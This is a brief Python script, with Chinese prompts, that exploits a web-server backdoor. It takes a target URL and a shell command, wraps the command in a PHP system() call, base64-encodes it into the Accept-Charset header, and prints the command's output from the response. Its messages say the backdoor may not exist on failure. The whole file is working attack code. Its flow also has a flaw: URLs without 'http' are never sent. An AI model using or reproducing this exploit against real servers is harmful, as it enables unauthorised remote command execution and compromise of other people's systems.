# -*- coding: utf-8 -*-
import requests,base64,sys
def go(url):
	if 'http' not in url:
		url = 'http://'+url
	else:
		a = input('请输入指令\n')
		b = 'system("%s");' %a
		c = base64.b64encode(b.encode('utf-8'))
		payload = (str(c,'utf-8'))
		headers = {
	                'Accept-Encoding':'gzip,deflate',
	                'Accept-Charset':payload
	            }
		send = requests.get(url=url,headers=headers,timeout=10)
		if send.status_code == 200:
			print('发送成功')
			print(send.text.split('\r\n')[2])
		else:
			print('执行失败，后门可能不存在')


if __name__ == '__main__':
	t=input('请输入url\n')
	go(t)
